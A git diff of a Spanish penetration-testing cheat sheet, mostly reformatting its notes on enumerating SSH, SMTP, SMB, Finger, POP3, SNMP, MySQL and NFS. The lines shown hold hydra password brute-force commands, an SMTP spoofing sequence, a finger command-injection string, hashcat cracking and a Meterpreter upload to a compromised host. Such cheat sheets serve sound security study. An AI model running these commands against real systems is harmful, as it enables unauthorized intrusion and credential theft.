@@ -101,11 +101,11 @@ ssh usuario@192.168.6.66
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.66 -t 4 ssh
 ```
 
-Programas clientes para SSH
-tunnelier
-winsshd
-putty
-winscp
+**Programas clientes para SSH**  
+tunnelier  
+winsshd  
+putty  
+winscp  
 
 **Archivos de configuracion relacionados a SSH**
   - ssh_config
@@ -133,7 +133,7 @@ nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cv
 
 **Mail Spoof Test**  
 ```
-HELO anything  
+HELO anything.com  
 MAIL FROM: spoofed_address  
 RCPT TO:valid_mail_account  
 DATA   
@@ -172,35 +172,36 @@ hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.ph
 
 ```html
 <form action=”index.php” method=”POST”>
-<input type=”text” name=”name” /><br><br>
-<input type=”password” name=”pwd” /><br><br>
-<input type=”submit” name=”sub” value=”submit”>
+  <input type=”text” name=”name” /><br><br>
+  <input type=”password” name=”pwd” /><br><br>
+  <input type=”submit” name=”sub” value=”submit”>
 </form>
 ```  
 
 Commando para Cracking de formularios POST：  
+```
 hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^ <title>invalido</title>”
+```
 
 **Herramientas Utiles**  
 Burpsuite
 
 **Archivos de configuracion relacionados a sitios web**  
-Archivos Genericos
-  - Examinar httpd.conf/
-JBoss
-  - JMX Console http://<IP>:8080/jmxconcole/
-    - War File
-Joomla
-  - configuration.php
-  - diagnostics.php
-  - joomla.inc.php
-  - config.inc.php
-Mambo
-  - configuration.php
-  - config.inc.php
-Wordpress
-  - setup-config.php
-  - wp-config.php
+  - Examinar httpd.conf/  
+  - JBoss
+    - JMX Console http://<IP>:8080/jmxconcole/
+      - War File  
+  - Joomla
+    - configuration.php
+    - diagnostics.php
+    - joomla.inc.php
+    - config.inc.php  
+  -Mambo
+    - configuration.php
+    - config.inc.php  
+  -Wordpress
+    - setup-config.php
+    - wp-config.php
 
 ## Enumerando SMB
 
@@ -227,6 +228,9 @@ smbclient -L //INSERTIPADDRESS/
 ```  
 
 ```  
+---------------------
+-- COMANDOS UTILES --
+---------------------
 smbclient \\\\10.10.10.59\\ACCT
 ```  
 
@@ -237,8 +241,8 @@ hydra -l administrator -P pass.txt IP smb
 ```  
 
 **Archivos de configuracion relacionados a SMB**  
-Smb.conf
-lmhosts
+  -Smb.conf  
+  -lmhosts
 
 ## Enumerando Finger
 
@@ -246,6 +250,9 @@ Descargar el siguiente script para enumerar este servicio:
 http://pentestmonkey.net/tools/user-enumeration/finger-user-enum
 
 ```  
+---------------------
+-- COMANDOS UTILES --
+---------------------
 finger 'a b c d e f g h' @example.com
 finger admin@example.com
 finger user@example.com
@@ -266,12 +273,16 @@ finger "|/bin/ls -a /@example.com"
 ## Enumerando POP3
 
 ```  
+---------------------
+-- COMANDOS UTILES --
+---------------------
 telnet INSERTIPADDRESS 110
-USER [username]
-PASS [password]
-Despues de iniciar sesion.  
+Ingresa tu usuario [username]
+Ingresa tu contraseña [password]
+- Despues de iniciar sesion. -
+
 list
-El comando anterior lista los mensajes.
+- El comando anterior lista los mensajes. -
 ```  
 
 **Escaneo con Nmap y ejecucion de Scripts relacionados.**  
@@ -308,9 +319,9 @@ snmpenum -t 192.168.1.X
 ```  
 
 **Archivos de configuracion relacionados a SNMP**  
-snmp.conf  
-snmpd.conf  
-snmp-config.xml    
+  -snmp.conf  
+  -snmpd.conf  
+  -snmp-config.xml    
 
 ## Enumerando MySQL
 
@@ -324,6 +335,9 @@ nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-du
 ```  
 
 ```sql
+---------------------
+-- COMANDOS UTILES --
+---------------------
 -- Ver base de datos disponibles.
 SHOW DATABASES;
 -- Crear una base de datos
@@ -358,9 +372,9 @@ UNIX
   - /etc/my.cnf
 
 Otros Archivos.  
-connections.log  
-update.log  
-common.log  
+  - connections.log  
+  -update.log  
+  -common.log  
 
 **Creaccion de usuarios**  
 Crear usuario y otorgarle privilegios:  
@@ -437,7 +451,7 @@ dnsenum --noreverse -o mydomain.xml example.com
 showmount -e IPADDR
 ```  
 
-montando el recurso compartido en /mnt/nfs sin bloquearlo  
+Montando el recurso compartido en /mnt/nfs sin bloquearlo  
 
 ```  
 mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
@@ -470,10 +484,10 @@ nmap -o -v binarychaos.com
 
 ## Busqueda de Exploits
 
-En el siguiente ejemplo realizo una busqueda de exploits relacionados a windows 2003  
+En el siguiente ejemplo realizo una busqueda de exploits relacionados a windows 8.1  
 
 ```  
-searchsploit windows 2003 | grep -i local
+searchsploit windows 8.1 | grep -i local
 ```  
 
 
@@ -501,6 +515,7 @@ tcpdump tcp port 80 -w output.pcap -i eth0
 Para la identificacion del tipo de hash utilizar:  
 
 ```  
+https://www.tunnelsup.com/hash-analyzer/
 hash-identifier [hash]
 john hashes.txt
 ```  
@@ -511,7 +526,7 @@ Ejemplos de uso de Hashcat:
 hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
 ```  
 
-Lista de tipos de hash soportados por Hashcat:  
+Lista de tipos de hash's soportados por Hashcat:  
 
 ```  
 https://hashcat.net/wiki/doku.php?id=example_hashes 
@@ -588,6 +603,9 @@ crunch 15 15 -f /usr/share/crunch/charset.lst symbols14 -t Th4C00lTheacha@ -o br
 ```  
 
 ```bash
+---------------------
+-- COMANDOS UTILES --
+---------------------
 for i in {0..9}; do echo Th4C00lTheacha$i; done >> hoola.txt
 ```  
 
@@ -729,6 +747,7 @@ msf5 exploit(multi/handler) > run
 
 Luego de comprometer una maquina y tener una shell de meterpreter, hay multiples comandos que nos facilitaran la vida en la hora de interactuar con nuestra maquina victima.  
 
+**Comandos Utiles**
 Como subir un archivo a una maquina comprometida con windows
 ```  
 upload file c:\\windows
